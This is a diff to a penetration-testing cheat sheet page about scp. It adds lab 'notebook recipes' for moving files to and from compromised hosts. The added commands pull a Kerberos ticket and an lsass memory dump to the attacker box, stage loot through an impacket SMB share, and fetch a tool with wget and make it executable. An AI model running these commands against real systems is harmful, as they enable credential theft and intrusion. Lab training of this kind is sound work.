@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=scp) · [All tools](/index)
+
 ## Commands
 
 **Kali**
@@ -22,8 +24,101 @@ scp USER@TARGET_IP:/tmp/file.zip ./file.zip
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=scp)
+## Notebook recipes
 
-## Learning and original examples
+5 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [File Transfers for Linux and Windows](/post-exploitation/file-transfers-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="SCP (SSH-based Transfer)">
+
+### SCP (SSH-based Transfer)
+
+**File Transfers for Linux and Windows**
+
+```bash
+# Enable SSH on your attack box first
+sudo systemctl enable ssh && sudo systemctl start ssh
+
+# From target — download a file from attack box
+scp user@<ATTACKER_IP>:/path/to/file .
+
+# From attack box — upload a file to target
+scp /etc/passwd htb-student@<TARGET_IP>:/home/htb-student/
+```
+
+</Accordion>
+
+<Accordion title="Step 5 — Transfer the ticket from LINUX01 to Kali">
+
+### Step 5 — Transfer the ticket from LINUX01 to Kali
+
+**Pass the Ticket from Linux**
+
+```bash
+# [ON KALI]
+scp -P 2222 'david@inlanefreight.htb@10.129.204.23':'/home/david@inlanefreight.htb/julio.ccache' .
+```
+
+</Accordion>
+
+<Accordion title="Downloading TO a Linux target">
+
+### Downloading TO a Linux target
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+wget http://<reachable>:8080/tool -O /tmp/tool && chmod +x /tmp/tool
+curl http://<reachable>:8080/tool -o /tmp/tool
+# recursive (a whole dir): wget -r -np -nH --cut-dirs=1 -R "index.html*" http://<reachable>:8080/Linux/
+scp tool jbetty@<DMZ_IP>:/tmp/          # if you have SSH
+```
+
+</Accordion>
+
+<Accordion title="Pulling files FROM the target to Kali (the hard direction)">
+
+### Pulling files FROM the target to Kali (the hard direction)
+
+**Pivoting and File Transfer: Field Reference**
+
+```bash
+# 1) evil-winrm has it built in (pulls over your existing session):
+*Evil-WinRM* PS> download C:\Temp\lsass.dmp /home/kali/loot/lsass.dmp
+*Evil-WinRM* PS> upload /home/kali/tools/PrintSpoofer64.exe   # the reverse
+
+# 2) Stage through the DMZ (a host the internal box CAN reach):
+#    run smbserver on DMZ01, push from internal host, then SSH-pull DMZ->Kali
+impacket-smbserver share /tmp -smb2support -username u -password p     # ON DMZ01
+#    on the internal host:
+net use \\172.16.119.13\share /user:u p
+copy C:\Temp\loot.zip \\172.16.119.13\share\
+#    DMZ -> Kali:
+scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
+
+# 3) Reverse forward (ligolo listener_add or chisel/ssh -R), then smbserver/nc ON Kali
+#    becomes reachable from inside, push to it normally.
+
+# 4) base64 paste (small files / when nothing else works):
+#    Windows:  [Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\x")) | clip
+#    Kali:     echo '<paste>' | base64 -d > x
+```
+
+</Accordion>
+
+<Accordion title="File Transfer Protocols">
+
+### File Transfer Protocols
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: SCP 22 Secure copy over SSH scp file.txt &lt;user>@&lt;IP>:/path/
+
+```text
+scp file.txt <user>@<IP>:/path/
+```
+
+</Accordion>
+
+</AccordionGroup>
